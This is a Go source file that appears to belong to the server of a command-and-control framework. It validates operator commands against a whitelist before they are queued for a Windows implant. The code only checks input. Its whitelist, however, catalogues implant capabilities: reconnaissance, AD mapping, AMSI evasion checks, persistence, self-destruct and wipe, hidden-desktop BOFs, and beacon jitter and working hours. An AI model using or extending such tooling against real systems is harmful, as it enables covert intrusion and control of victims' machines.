// validate.go — STRICT server-side command validation
//
// GOAL (operator requirement): "jo command main type kar raha hun wo
// validate ho jaye — faltu commands server se jayenge hi nahi, server hi
// rok lega aur bolega ye command nahi hai" — the agent crash-se-bach jayega.
//
// Design:
//   • ONE whitelist (AgentCommands) mirroring the implant's dispatcher.rs
//     inline registry + shell/powershell + bof + profile.
//   • handleSessionTask calls ValidateCommand() BEFORE AddTask() — an
//     unknown command returns HTTP 400 with a human-readable message and
//     NOTHING is queued for the agent.
//   • Required-arg commands (shell, download, kill, ...) are rejected at
//     the gate too — saves a full beacon round trip on operator typos.
//   • Size caps block oversized payloads from ever reaching the wire.
//
// NOTE: keep in sync with implant/agent_core/src/core_agent/exec/dispatcher.rs
// (run_inline match arms) and server/go_server/agent.go (cmdTaskType map).

package main

import (
        "fmt"
        "strings"
)

// AgentCommands — the full operator-facing command whitelist.
// value = short category tag (for log lines / future per-type policies).
var AgentCommands = map[string]string{
        // ── Recon (inline WinAPI) ─────────────────────────────────────────
        "whoami": "recon", "whoamifull": "recon", "hostname": "recon",
        "sysinfo": "recon", "ps": "recon", "tasklist": "recon",
        "privs": "recon", "arch": "recon", "domain": "recon",
        "env": "recon", "uptime": "recon", "pid": "recon",
        "drives": "recon", "getuid": "recon", "procinfo": "recon",
        "listdlls": "recon", "dlls": "recon",
        // v8 graph collectors (Phase D/E) — feed the UI graph views:
        //   admap  = AD/domain discovery (DC + browse list)
        //   agraph = node enrichment (ARP/TCP neighbors)
        "admap": "recon", "agraph": "recon",
        // v9: trueip = agent's public/NAT IP (operator-triggered echo check)
        "trueip": "net",

        // ── Network (inline WinAPI / Winsock) ─────────────────────────────
        "ipconfig": "net", "ifconfig": "net", "netstat": "net",
        "arp": "net", "dns": "net", "nslookup": "net", "ping": "net",
        "netusers": "net", "users": "net", "netgroups": "net",
        "groups": "net", "netshare": "net", "shares": "net",

        // ── Registry / services / scheduled tasks / events ────────────────
        "reg": "sys", "regquery": "sys", "sc": "sys",
        "schtasks": "sys", "schtask": "sys",
        "eventlog": "sys", "events": "sys",

        // ── Filesystem (Rust std::fs) ─────────────────────────────────────
        "ls": "fs", "dir": "fs", "cat": "fs", "type": "fs",
        "pwd": "fs", "cd": "fs", "chdir": "fs", "mkdir": "fs", "md": "fs",
        "touch": "fs", "rm": "fs", "del": "fs", "cp": "fs", "copy": "fs",
        "mv": "fs", "move": "fs", "rename": "fs", "ren": "fs",
        "find": "fs", "hash": "fs", "checksum": "fs",
        "download": "fs", "upload": "fs",
        "b64encode": "fs", "b64enc": "fs", "b64decode": "fs", "b64dec": "fs",

        // ── Process spawn (operator opted in) ─────────────────────────────
        "shell": "spawn", "cmd": "spawn", "exec": "spawn",
        "powershell": "spawn",

        // ── Process ops ───────────────────────────────────────────────────
        "kill": "proc", "screenshot": "proc", "echo": "misc",

        // ── Evasion / OPSEC / persistence ─────────────────────────────────
        "amsi_check": "opsec", "amsi": "opsec",
        "persist": "persist", "wipe": "opsec", "selfdestruct": "opsec",

        // ── Hidden desktop (BOF-backed, embedded) ─────────────────────────
        "hidden_desktop": "bof", "hdesktop": "bof", "hd": "bof",

        // ── Beacon control ────────────────────────────────────────────────
        "sleep": "beacon", "jitter": "beacon",
        "working_hours": "beacon", "workhours": "beacon",
        "config": "beacon", "beaconinfo": "beacon",

        // ── Server-intercepted (never reach the agent as raw commands) ────
        "bof": "server", "boflist": "server",
        "profile": "server", "!profile": "server",
}

// RequiredArgCommands — commands that are useless (or error at the agent)
// without arguments. Rejecting them at the server saves a full beacon
// round trip on operator typos.
var RequiredArgCommands = map[string]bool{
        "shell": true, "cmd": true, "exec": true, "powershell": true,
        "cat": true, "type": true, "cd": true, "chdir": true,
        "download": true, "upload": true, "kill": true,
        "hash": true, "checksum": true, "find": true,
        "dns": true, "nslookup": true, "ping": true,
}

const (
        maxCommandLen = 64
        maxArgsLen    = 8 << 20 // 8MB — upload/b64 payloads can be large
)

// ValidateCommand gates EVERY operator task before it reaches AddTask().
// nil → command may be queued. Non-nil → HTTP 400, nothing queued.
func ValidateCommand(command, args string) error {
        cmd := strings.ToLower(strings.TrimSpace(command))

        if cmd == "" {
                return fmt.Errorf("empty command — type 'help' for the command list")
        }
        if len(cmd) > maxCommandLen {
                return fmt.Errorf("command too long (%d chars, cap %d)", len(cmd), maxCommandLen)
        }
        if len(args) > maxArgsLen {
                return fmt.Errorf("args too large (%d bytes, cap %d)", len(args), maxArgsLen)
        }
        if strings.ContainsRune(cmd, 0) {
                return fmt.Errorf("command contains NUL byte")
        }

        category, known := AgentCommands[cmd]
        if !known {
                return fmt.Errorf(
                        "unknown command '%s' — NOT sent to the agent. Type 'help' for the command list",
                        cmd)
        }

        if RequiredArgCommands[cmd] && strings.TrimSpace(args) == "" {
                return fmt.Errorf("'%s' needs an argument — nothing queued (category: %s)", cmd, category)
        }

        return nil
}

// IsKnownAgentCommand — exported helper for tests / other handlers
func IsKnownAgentCommand(cmd string) bool {
        _, ok := AgentCommands[strings.ToLower(strings.TrimSpace(cmd))]
        return ok
}
